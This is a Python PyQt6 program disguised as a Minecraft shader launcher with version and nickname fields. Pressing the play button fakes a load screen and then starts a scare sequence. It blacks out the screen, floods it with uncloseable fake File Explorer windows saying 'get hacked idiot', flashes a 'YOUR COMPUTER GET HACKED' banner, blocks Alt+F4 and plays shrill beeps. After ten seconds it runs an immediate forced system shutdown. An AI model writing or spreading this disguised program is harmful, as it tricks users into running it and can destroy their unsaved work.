import sys
import random
import winsound
import threading

if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QComboBox, QFrame, QLineEdit, QProgressBar
)
from PyQt6.QtCore import Qt, QTimer
from PyQt6.QtGui import QKeyEvent


class ExplorerWindow(QWidget):
    def __init__(self, manager):
        super().__init__()
        self.manager = manager

        self.setWindowFlags(
            Qt.WindowType.FramelessWindowHint |
            Qt.WindowType.WindowStaysOnTopHint |
            Qt.WindowType.Tool
        )

        w = random.randint(380, 560)
        h = random.randint(260, 380)
        self.setFixedSize(w, h)

        screen = QApplication.primaryScreen().geometry()
        self.move(
            random.randint(0, max(0, screen.width() - w)),
            random.randint(0, max(0, screen.height() - h - 52))
        )

        self.setStyleSheet("background-color: #f0f0f0; border: 1px solid #999;")

        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        title = QLabel("  File Explorer")
        title.setFixedHeight(30)
        title.setStyleSheet("""
            background-color: #e8e8e8;
            color: #222;
            font-family: 'Segoe UI';
            font-size: 13px;
            padding-left: 10px;
            border-bottom: 1px solid #ccc;
        """)
        layout.addWidget(title)

        toolbar = QLabel("  ←  →  ↑    This PC > Windows (C:) > Users")
        toolbar.setFixedHeight(28)
        toolbar.setStyleSheet("""
            background-color: #f5f5f5;
            color: #444;
            font-family: 'Segoe UI';
            font-size: 12px;
            padding-left: 8px;
            border-bottom: 1px solid #ddd;
        """)
        layout.addWidget(toolbar)

        content = QLabel()
        content.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignLeft)
        content.setStyleSheet("""
            background-color: white;
            color: #222;
            font-family: 'Segoe UI';
            font-size: 13px;
            padding: 12px;
        """)
        content.setText(
            "📁  Desktop\n"
            "📁  Documents\n"
            "📁  Downloads\n\n"
            "get hacked idiot !\n\n"
            "thanks for your computer !"
        )
        layout.addWidget(content)

        self.vx = random.choice([-1, 1]) * random.uniform(3.8, 8.0)
        self.vy = random.choice([-1, 1]) * random.uniform(3.8, 8.0)

        self.move_timer = QTimer(self)
        self.move_timer.timeout.connect(self.fly)
        self.move_timer.start(14)

    def fly(self):
        screen = QApplication.primaryScreen().geometry()
        pos = self.pos()
        new_x = pos.x() + int(self.vx)
        new_y = pos.y() + int(self.vy)

        max_y = screen.height() - self.height() - 52
        if new_x <= 0 or new_x + self.width() >= screen.width():
            self.vx *= -1
        if new_y <= 0 or new_y >= max_y:
            self.vy *= -1
            new_y = max(0, min(new_y, max_y))

        self.move(new_x, new_y)

    def keyPressEvent(self, event: QKeyEvent):
        if event.key() == Qt.Key.Key_F4 and event.modifiers() == Qt.KeyboardModifier.AltModifier:
            event.ignore()
            return
        super().keyPressEvent(event)

    def closeEvent(self, event):
        if self.manager and self.manager.chaos_active:
            event.ignore()
            self.manager.spawn()
        else:
            event.accept()


class BlackBackground(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(
            Qt.WindowType.FramelessWindowHint |
            Qt.WindowType.WindowStaysOnTopHint |
            Qt.WindowType.Tool
        )
        screen = QApplication.primaryScreen().geometry()
        self.setGeometry(0, 0, screen.width(), screen.height())
        self.setStyleSheet("background-color: #000000;")


class HackBanner(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(
            Qt.WindowType.FramelessWindowHint |
            Qt.WindowType.WindowStaysOnTopHint |
            Qt.WindowType.Tool |
            Qt.WindowType.WindowDoesNotAcceptFocus
        )
        self.setAttribute(Qt.WidgetAttribute.WA_ShowWithoutActivating)

        screen = QApplication.primaryScreen().geometry()
        self.setGeometry(0, screen.height() - 48, screen.width(), 48)
        self.setStyleSheet("background-color: #000000;")

        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)

        self.label = QLabel("YOUR COMPUTER GET HACKED")
        self.label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.label.setStyleSheet("""
            color: #ff2222;
            font-size: 22px;
            font-weight: 900;
            font-family: Consolas, 'Courier New', monospace;
            letter-spacing: 3px;
        """)
        layout.addWidget(self.label)

        self.flash = False
        self.flash_timer = QTimer(self)
        self.flash_timer.timeout.connect(self.toggle_flash)
        self.flash_timer.start(450)

        self.top_timer = QTimer(self)
        self.top_timer.timeout.connect(self.force_top)
        self.top_timer.start(200)

    def force_top(self):
        self.raise_()
        if sys.platform == "win32":
            try:
                hwnd = int(self.winId())
                ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0001 | 0x0002 | 0x0040)
            except:
                pass

    def toggle_flash(self):
        self.flash = not self.flash
        if self.flash:
            self.label.setStyleSheet("""
                color: #ff0000;
                font-size: 22px;
                font-weight: 900;
                font-family: Consolas, 'Courier New', monospace;
                letter-spacing: 3px;
                background-color: #330000;
            """)
        else:
            self.label.setStyleSheet("""
                color: #ff2222;
                font-size: 22px;
                font-weight: 900;
                font-family: Consolas, 'Courier New', monospace;
                letter-spacing: 3px;
            """)

    def keyPressEvent(self, event: QKeyEvent):
        if event.key() == Qt.Key.Key_F4 and event.modifiers() == Qt.KeyboardModifier.AltModifier:
            event.ignore()
            return
        super().keyPressEvent(event)


class CyberLauncher(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CYBER SHADER LAUNCHER")
        self.setFixedSize(980, 680)
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
        self.setStyleSheet("background-color: #060418;")

        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(50, 40, 50, 40)

        header = QHBoxLayout()
        logo = QLabel("◆  CYBER SHADER CORE")
        logo.setStyleSheet("color: #00ffff; font-size: 26px; font-weight: 900; font-family: Consolas;")
        header.addWidget(logo)
        header.addStretch()

        close_btn = QPushButton("✕")
        close_btn.setFixedSize(34, 34)
        close_btn.setStyleSheet("""
            QPushButton {
                background: rgba(255,0,80,0.25);
                color: #ff3366;
                border: 1px solid #ff0044;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover { background: rgba(255,0,80,0.55); }
        """)
        close_btn.clicked.connect(self.close)
        header.addWidget(close_btn)
        layout.addLayout(header)

        subtitle = QLabel("NEURAL LINK ESTABLISHED  •  v5.7 WITH SOUND")
        subtitle.setStyleSheet("color: rgba(0,255,255,0.5); font-size: 11px; font-family: Consolas; letter-spacing: 2px;")
        layout.addWidget(subtitle)
        layout.addSpacing(25)

        card = QFrame()
        card.setStyleSheet("""
            QFrame {
                background: rgba(10, 14, 30, 0.92);
                border: 1px solid rgba(0, 255, 255, 0.35);
                border-radius: 10px;
            }
        """)
        card_layout = QVBoxLayout(card)
        card_layout.setContentsMargins(35, 30, 35, 30)
        card_layout.setSpacing(14)

        lbl1 = QLabel(">> SELECT PROTOCOL")
        lbl1.setStyleSheet("color: rgba(0,255,255,0.6); font-size: 11px; font-family: Consolas;")
        card_layout.addWidget(lbl1)

        self.version = QComboBox()
        self.version.addItems([
            "1.21.11  •  FULL SHADER",
            "1.20.6  •  STABLE CYBER CORE",
            "1.19.4  •  PERFORMANCE MODE",
            "1.16.5  •  CLASSIC + OPTIFINE",
            "1.12.2  •  MODDED NEURAL",
            "1.8.9   •  PVP COMBAT"
        ])
        self.version.setStyleSheet("""
            QComboBox {
                background: #060e1a;
                color: #00ffff;
                border: 1px solid #00cfff;
                border-radius: 5px;
                padding: 10px;
                font-family: Consolas;
            }
        """)
        card_layout.addWidget(self.version)

        lbl2 = QLabel(">> OPERATOR ID")
        lbl2.setStyleSheet("color: rgba(0,255,255,0.6); font-size: 11px; font-family: Consolas;")
        card_layout.addWidget(lbl2)

        self.nick = QLineEdit("NEURAL_STEVE_01")
        self.nick.setStyleSheet("""
            QLineEdit {
                background: #060e1a;
                color: #00ffff;
                border: 1px solid #00cfff;
                border-radius: 5px;
                padding: 10px;
                font-family: Consolas;
                font-weight: bold;
            }
        """)
        card_layout.addWidget(self.nick)

        card_layout.addSpacing(15)

        self.play_btn = QPushButton("▶  INITIATE SHADER PROTOCOL")
        self.play_btn.setFixedHeight(54)
        self.play_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.play_btn.setStyleSheet("""
            QPushButton {
                background-color: #003344;
                color: #00ffff;
                border: 2px solid #00e5ff;
                border-radius: 6px;
                font-size: 15px;
                font-weight: 800;
                font-family: Consolas;
            }
            QPushButton:hover {
                background-color: #004455;
                border: 2px solid #ff00cc;
                color: white;
            }
            QPushButton:disabled {
                background-color: #001a22;
                color: #006677;
            }
        """)
        self.play_btn.clicked.connect(self.start_loading)
        card_layout.addWidget(self.play_btn)

        layout.addWidget(card)
        layout.addStretch()

        self.loading = QProgressBar()
        self.loading.setRange(0, 100)
        self.loading.setStyleSheet("""
            QProgressBar {
                background: #001a22;
                border: 1px solid #00cfff;
                border-radius: 4px;
                text-align: center;
                color: #00ffff;
                font-family: Consolas;
            }
            QProgressBar::chunk { background: #00e5ff; }
        """)
        self.loading.hide()
        layout.addWidget(self.loading)

        self.flying = []
        self.chaos_active = False
        self.banner = None
        self.black_bg = None
        self.old_pos = None
        self.sound_timer = None

    def play_beep(self):
        if not self.chaos_active:
            return
        try:
            # Wysoki piskliwy dźwięk
            freq = random.randint(1800, 3200)
            duration = random.randint(80, 180)
            threading.Thread(target=winsound.Beep, args=(freq, duration), daemon=True).start()
        except:
            pass

    def keyPressEvent(self, event: QKeyEvent):
        if self.chaos_active and event.key() == Qt.Key.Key_F4 and event.modifiers() == Qt.KeyboardModifier.AltModifier:
            event.ignore()
            return
        super().keyPressEvent(event)

    def closeEvent(self, event):
        if self.chaos_active:
            event.ignore()
        else:
            event.accept()

    def start_loading(self):
        self.play_btn.setEnabled(False)
        self.play_btn.setText("LOADING...")
        self.loading.show()
        self.loading.setValue(0)
        self.val = 0
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_load)
        self.timer.start(22)

    def update_load(self):
        self.val += random.randint(3, 7)
        self.loading.setValue(min(100, self.val))
        if self.val >= 100:
            self.timer.stop()
            QTimer.singleShot(150, self.start_chaos)

    def spawn(self):
        if len(self.flying) >= 32:
            return
        win = ExplorerWindow(self)
        win.show()
        self.flying.append(win)

    def start_chaos(self):
        self.chaos_active = True

        # Czarne tło na cały ekran
        self.black_bg = BlackBackground()
        self.black_bg.show()

        # Pasek na dole
        self.banner = HackBanner()
        self.banner.show()
        self.banner.force_top()

        # 30 okien
        for _ in range(30):
            self.spawn()

        self.spawn_timer = QTimer(self)
        self.spawn_timer.timeout.connect(self.spawn)
        self.spawn_timer.start(400)

        # Piskliwe dźwięki co chwilę
        self.sound_timer = QTimer(self)
        self.sound_timer.timeout.connect(self.play_beep)
        self.sound_timer.start(280)

        # Po 10 sekundach od rozpoczęcia chaosu wyłącz komputer.
        QTimer.singleShot(10000, self.shutdown_computer)

        QTimer.singleShot(14000, self.stop_chaos)

    def shutdown_computer(self):
        if sys.platform == "win32":
            import subprocess
            subprocess.run(["shutdown", "/s", "/t", "0"], check=False)

    def stop_chaos(self):
        self.chaos_active = False

        if hasattr(self, 'spawn_timer'):
            self.spawn_timer.stop()
        if self.sound_timer:
            self.sound_timer.stop()

        for w in self.flying:
            w.close()
        self.flying.clear()

        if self.banner:
            self.banner.top_timer.stop()
            self.banner.close()
            self.banner = None

        if self.black_bg:
            self.black_bg.close()
            self.black_bg = None

        self.play_btn.setText("▶  INITIATE SHADER PROTOCOL")
        self.play_btn.setEnabled(True)
        self.loading.hide()

        joke = QLabel("JUST KIDDING 😎\nChaos finished", self)
        joke.setGeometry(0, 0, 980, 680)
        joke.setStyleSheet("background: rgba(0,0,0,0.88); color: #00ff99; font-size: 32px; font-weight: bold; font-family: Consolas;")
        joke.setAlignment(Qt.AlignmentFlag.AlignCenter)
        joke.show()
        QTimer.singleShot(3000, joke.deleteLater)

    def mousePressEvent(self, e):
        if e.button() == Qt.MouseButton.LeftButton and not self.chaos_active:
            self.old_pos = e.globalPosition().toPoint()

    def mouseMoveEvent(self, e):
        if self.old_pos and not self.chaos_active:
            delta = e.globalPosition().toPoint() - self.old_pos
            self.move(self.pos() + delta)
            self.old_pos = e.globalPosition().toPoint()

    def mouseReleaseEvent(self, e):
        self.old_pos = None


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = CyberLauncher()
    window.show()
    sys.exit(app.exec())